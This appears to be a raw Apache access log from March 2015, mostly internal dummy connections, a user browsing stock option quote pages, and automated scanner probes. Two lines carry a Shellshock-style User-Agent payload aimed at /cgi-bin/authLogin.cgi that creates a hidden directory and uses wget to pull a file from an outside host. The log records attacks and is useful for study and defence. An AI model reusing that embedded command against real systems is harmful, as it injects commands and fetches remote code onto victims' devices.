::1 - - [09/Mar/2015:17:31:56 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
80.82.64.116 - - [09/Mar/2015:18:06:15 -0400] "GET /cgi-bin/index.cgi HTTP/1.0" 404 514 "-" "-"
218.80.224.45 - - [09/Mar/2015:19:43:18 -0400] "HEAD / HTTP/1.0" 200 278 "-" "-"
74.193.175.159 - - [09/Mar/2015:19:50:16 -0400] "GET /tmUnblock.cgi HTTP/1.1" 400 527 "-" "-"
::1 - - [09/Mar/2015:20:48:55 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [09/Mar/2015:20:53:11 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [09/Mar/2015:21:20:17 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [09/Mar/2015:23:07:49 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
80.82.64.116 - - [10/Mar/2015:02:01:52 -0400] "GET /cgi-bin/index.cgi HTTP/1.0" 404 514 "-" "-"
54.153.2.23 - - [10/Mar/2015:02:13:06 -0400] "HEAD / HTTP/1.0" 200 278 "-" "-"
137.175.177.157 - - [10/Mar/2015:02:15:52 -0400] "GET /tmUnblock.cgi HTTP/1.1" 400 527 "-" "-"
::1 - - [10/Mar/2015:03:40:17 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [10/Mar/2015:03:40:18 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [10/Mar/2015:03:55:35 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
206.59.5.67 - - [10/Mar/2015:04:34:52 -0400] "GET /tmUnblock.cgi HTTP/1.1" 400 527 "-" "-"
91.238.134.51 - - [10/Mar/2015:06:31:31 -0400] "GET http://pl.wikipedia.org/wiki/Special:Search?search=&go=Go HTTP/1.1" 404 504 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
::1 - - [10/Mar/2015:07:10:15 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [10/Mar/2015:07:23:08 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
68.185.202.206 - - [10/Mar/2015:07:59:20 -0400] "GET /favicon.ico HTTP/1.1" 404 470 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36"
123.157.150.2 - - [10/Mar/2015:09:02:01 -0400] "GET /manager/html HTTP/1.1" 404 495 "-" "Mozilla/3.0 (compatible; Indy Library)"
::1 - - [10/Mar/2015:11:08:17 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [10/Mar/2015:13:12:00 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
211.137.190.38 - - [10/Mar/2015:13:56:09 -0400] "HEAD / HTTP/1.0" 200 278 "-" "-"
222.186.42.27 - - [10/Mar/2015:14:12:43 -0400] "GET /manager/html HTTP/1.1" 404 495 "-" "Mozilla/3.0 (compatible; Indy Library)"
91.238.134.51 - - [10/Mar/2015:14:13:14 -0400] "GET http://pl.wikipedia.org/wiki/Special:Search?search=&go=Go HTTP/1.1" 404 504 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
::1 - - [10/Mar/2015:15:26:36 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
116.228.70.205 - - [10/Mar/2015:15:27:44 -0400] "HEAD / HTTP/1.0" 200 278 "-" "-"
::1 - - [10/Mar/2015:16:13:48 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
63.253.84.57 - - [10/Mar/2015:16:51:02 -0400] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 499 "-" "() { :; }; /bin/mkdir -p /share/HDB_DATA/.../ && /usr/bin/wget -q -c http://lliillii.altervista.org/io.php 0<&1 2>&1"
::1 - - [10/Mar/2015:17:13:25 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [10/Mar/2015:18:33:54 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [10/Mar/2015:20:30:31 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
80.82.64.116 - - [10/Mar/2015:21:07:46 -0400] "GET /cgi-bin/index.cgi HTTP/1.0" 404 514 "-" "-"
186.42.184.78 - - [10/Mar/2015:22:06:19 -0400] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 499 "-" "() { :; }; /bin/mkdir -p /share/HDB_DATA/.../ && /usr/bin/wget -q -c http://lliillii.altervista.org/io.php 0<&1 2>&1"
61.240.144.65 - - [10/Mar/2015:22:14:57 -0400] "GET / HTTP/1.0" 200 1401 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
80.82.64.116 - - [10/Mar/2015:23:07:40 -0400] "GET /cgi-bin/index.cgi HTTP/1.0" 404 514 "-" "-"
186.5.63.132 - - [11/Mar/2015:02:26:38 -0400] "HEAD / HTTP/1.0" 200 278 "-" "-"
80.82.64.116 - - [11/Mar/2015:02:43:50 -0400] "GET /cgi-bin/index.cgi HTTP/1.0" 404 514 "-" "-"
::1 - - [11/Mar/2015:04:58:16 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [11/Mar/2015:07:38:56 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [11/Mar/2015:08:03:47 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [11/Mar/2015:08:03:49 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [11/Mar/2015:08:03:50 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [11/Mar/2015:08:03:55 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [11/Mar/2015:08:04:15 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [11/Mar/2015:08:04:39 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [11/Mar/2015:08:04:51 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [11/Mar/2015:08:04:52 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [11/Mar/2015:08:04:53 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [11/Mar/2015:08:06:34 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [11/Mar/2015:08:06:35 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [11/Mar/2015:08:06:36 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [11/Mar/2015:08:19:12 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [11/Mar/2015:08:24:57 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [11/Mar/2015:08:57:08 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [11/Mar/2015:09:20:39 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [11/Mar/2015:10:34:58 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [11/Mar/2015:10:55:28 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [11/Mar/2015:10:55:29 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [11/Mar/2015:10:55:33 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [11/Mar/2015:10:55:34 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [11/Mar/2015:10:55:35 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [11/Mar/2015:10:55:36 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [11/Mar/2015:10:55:37 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [11/Mar/2015:10:55:38 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
80.82.64.116 - - [11/Mar/2015:12:04:38 -0400] "GET /cgi-bin/index.cgi HTTP/1.0" 404 514 "-" "-"
::1 - - [11/Mar/2015:12:21:57 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [11/Mar/2015:14:28:23 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [11/Mar/2015:14:32:37 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
188.138.17.205 - - [11/Mar/2015:15:44:44 -0400] "GET / HTTP/1.1" 200 1401 "-" "-"
97.94.213.85 - - [11/Mar/2015:16:36:17 -0400] "GET / HTTP/1.1" 304 173 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:36:17 -0400] "GET /getlist.js HTTP/1.1" 304 173 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:36:17 -0400] "GET /favicon.ico HTTP/1.1" 404 470 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:36:24 -0400] "GET /getyear.php?q=CSCO&d=C&sid=0.3061220252420753 HTTP/1.1" 200 268 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:36:25 -0400] "GET /getday.php?q=CSCO&d=C&y=2015&m=&sid=0.5895368077326566 HTTP/1.1" 200 256 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:36:25 -0400] "GET /getstrike.php?q=CSCO&d=C&y=2015&m=&r=&sid=0.23407911835238338 HTTP/1.1" 200 256 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:36:25 -0400] "GET /getmonth.php?q=CSCO&d=C&y=2015&sid=0.4678161896299571 HTTP/1.1" 200 277 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:36:25 -0400] "GET /getday.php?q=CSCO&d=C&y=2015&m=02&sid=0.4411213581915945 HTTP/1.1" 200 259 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:36:25 -0400] "GET /getstrike.php?q=CSCO&d=C&y=2015&m=02&r=&sid=0.3918817259836942 HTTP/1.1" 200 256 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:36:25 -0400] "GET /getday.php?q=CSCO&d=C&y=2015&m=02&sid=0.6496182503178716 HTTP/1.1" 200 259 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:36:25 -0400] "GET /getstrike.php?q=CSCO&d=C&y=2015&m=02&r=&sid=0.6198658305220306 HTTP/1.1" 200 256 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:36:25 -0400] "GET /getstrike.php?q=CSCO&d=C&y=2015&m=02&r=27&sid=0.21463672700338066 HTTP/1.1" 200 305 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:36:30 -0400] "GET /getmonth.php?q=CSCO&d=C&y=2017&sid=0.9517349489033222 HTTP/1.1" 200 259 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:36:30 -0400] "GET /getday.php?q=CSCO&d=C&y=2017&m=01&sid=0.5921312435530126 HTTP/1.1" 200 259 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:36:30 -0400] "GET /getstrike.php?q=CSCO&d=C&y=2017&m=01&r=&sid=0.13692882121540606 HTTP/1.1" 200 256 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:36:30 -0400] "GET /getstrike.php?q=CSCO&d=C&y=2017&m=01&r=20&sid=0.7784749828279018 HTTP/1.1" 200 292 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:36:47 -0400] "POST /result.php HTTP/1.1" 200 849 "http://66.175.223.240:8080/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:37:04 -0400] "GET /index.html?submit=BACK HTTP/1.1" 304 173 "http://66.175.223.240:8080/result.php" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:40:12 -0400] "GET /getyear.php?q=AAPL&d=C&sid=0.48282410274259746 HTTP/1.1" 200 268 "http://66.175.223.240:8080/index.html?submit=BACK" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:40:12 -0400] "GET /getday.php?q=AAPL&d=C&y=2015&m=&sid=0.4881263105198741 HTTP/1.1" 200 256 "http://66.175.223.240:8080/index.html?submit=BACK" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:40:12 -0400] "GET /getstrike.php?q=AAPL&d=C&y=2015&m=&r=&sid=0.8043075203895569 HTTP/1.1" 200 256 "http://66.175.223.240:8080/index.html?submit=BACK" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:40:12 -0400] "GET /getmonth.php?q=AAPL&d=C&y=2015&sid=0.4349203316960484 HTTP/1.1" 200 277 "http://66.175.223.240:8080/index.html?submit=BACK" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:40:12 -0400] "GET /getstrike.php?q=AAPL&d=C&y=2015&m=02&r=&sid=0.438496679533273 HTTP/1.1" 200 256 "http://66.175.223.240:8080/index.html?submit=BACK" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:40:12 -0400] "GET /getday.php?q=AAPL&d=C&y=2015&m=02&sid=0.7720143292099237 HTTP/1.1" 200 259 "http://66.175.223.240:8080/index.html?submit=BACK" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:40:12 -0400] "GET /getstrike.php?q=AAPL&d=C&y=2015&m=02&r=&sid=0.3670756162609905 HTTP/1.1" 200 256 "http://66.175.223.240:8080/index.html?submit=BACK" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:40:12 -0400] "GET /getday.php?q=AAPL&d=C&y=2015&m=02&sid=0.21993970242328942 HTTP/1.1" 200 259 "http://66.175.223.240:8080/index.html?submit=BACK" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:40:12 -0400] "GET /getstrike.php?q=AAPL&d=C&y=2015&m=02&r=27&sid=0.25020722043700516 HTTP/1.1" 200 368 "http://66.175.223.240:8080/index.html?submit=BACK" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:40:15 -0400] "GET /getmonth.php?q=AAPL&d=C&y=2016&sid=0.1774922322947532 HTTP/1.1" 200 259 "http://66.175.223.240:8080/index.html?submit=BACK" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:40:15 -0400] "GET /getstrike.php?q=AAPL&d=C&y=2016&m=01&r=&sid=0.22879341011866927 HTTP/1.1" 200 256 "http://66.175.223.240:8080/index.html?submit=BACK" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:40:15 -0400] "GET /getday.php?q=AAPL&d=C&y=2016&m=01&sid=0.21777173085138202 HTTP/1.1" 200 259 "http://66.175.223.240:8080/index.html?submit=BACK" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:40:15 -0400] "GET /getstrike.php?q=AAPL&d=C&y=2016&m=01&r=15&sid=0.14871815778315067 HTTP/1.1" 200 453 "http://66.175.223.240:8080/index.html?submit=BACK" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:40:18 -0400] "GET /getmonth.php?q=AAPL&d=C&y=2017&sid=0.3431686460971832 HTTP/1.1" 200 259 "http://66.175.223.240:8080/index.html?submit=BACK" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:40:19 -0400] "GET /getstrike.php?q=AAPL&d=C&y=2017&m=01&r=&sid=0.7609487858135253 HTTP/1.1" 200 256 "http://66.175.223.240:8080/index.html?submit=BACK" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:40:19 -0400] "GET /getday.php?q=AAPL&d=C&y=2017&m=01&sid=0.1238977478351444 HTTP/1.1" 200 259 "http://66.175.223.240:8080/index.html?submit=BACK" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
97.94.213.85 - - [11/Mar/2015:16:40:19 -0400] "GET /getstrike.php?q=AAPL&d=C&y=2017&m=01&r=20&sid=0.7922348577994853 HTTP/1.1" 200 332 "http://66.175.223.240:8080/index.html?submit=BACK" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
::1 - - [11/Mar/2015:17:11:29 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [11/Mar/2015:17:11:34 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [11/Mar/2015:17:11:36 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
68.185.202.206 - - [11/Mar/2015:18:31:04 -0400] "GET /favicon.ico HTTP/1.1" 404 470 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36"
::1 - - [11/Mar/2015:20:00:14 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [11/Mar/2015:20:01:44 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [11/Mar/2015:20:19:09 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
80.82.64.116 - - [11/Mar/2015:21:00:05 -0400] "GET /cgi-bin/index.cgi HTTP/1.0" 404 514 "-" "-"
::1 - - [11/Mar/2015:21:21:21 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
68.185.202.206 - - [11/Mar/2015:21:23:41 -0400] "GET /favicon.ico HTTP/1.1" 404 470 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36"
115.239.248.2 - - [12/Mar/2015:00:50:57 -0400] "GET /manager/html HTTP/1.1" 404 495 "-" "Mozilla/3.0 (compatible; Indy Library)"
::1 - - [12/Mar/2015:00:53:46 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
91.222.215.42 - - [12/Mar/2015:01:26:34 -0400] "GET /tmUnblock.cgi HTTP/1.1" 400 527 "-" "-"
::1 - - [12/Mar/2015:01:31:19 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [12/Mar/2015:01:31:20 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [12/Mar/2015:01:31:21 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [12/Mar/2015:02:22:39 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
60.169.80.3 - - [12/Mar/2015:03:09:29 -0400] "GET /manager/html HTTP/1.1" 404 495 "-" "Mozilla/3.0 (compatible; Indy Library)"
61.240.144.66 - - [12/Mar/2015:03:18:43 -0400] "GET / HTTP/1.0" 200 1401 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
::1 - - [12/Mar/2015:03:29:57 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [12/Mar/2015:04:54:47 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [12/Mar/2015:04:54:48 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [12/Mar/2015:04:54:49 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
116.228.70.228 - - [12/Mar/2015:05:06:17 -0400] "HEAD / HTTP/1.0" 200 278 "-" "-"
::1 - - [12/Mar/2015:05:06:49 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [12/Mar/2015:05:06:51 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [12/Mar/2015:05:06:54 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [12/Mar/2015:06:03:11 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [12/Mar/2015:06:44:56 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
121.8.241.180 - - [12/Mar/2015:07:32:16 -0400] "GET /manager/html HTTP/1.1" 404 495 "-" "Mozilla/3.0 (compatible; Indy Library)"
::1 - - [12/Mar/2015:07:34:59 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [12/Mar/2015:09:30:39 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
85.18.173.109 - - [12/Mar/2015:09:51:42 -0400] "HEAD / HTTP/1.0" 200 278 "-" "-"
80.82.64.116 - - [12/Mar/2015:11:55:48 -0400] "GET /cgi-bin/index.cgi HTTP/1.0" 404 514 "-" "-"
::1 - - [12/Mar/2015:12:20:09 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [12/Mar/2015:13:48:57 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [12/Mar/2015:13:49:02 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [12/Mar/2015:13:49:07 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
::1 - - [12/Mar/2015:14:37:18 -0400] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.14 (Ubuntu) (internal dummy connection)"
41.203.214.186 - - [12/Mar/2015:15:15:03 -0400] "GET /tmUnblock.cgi HTTP/1.1" 400 527 "-" "-"
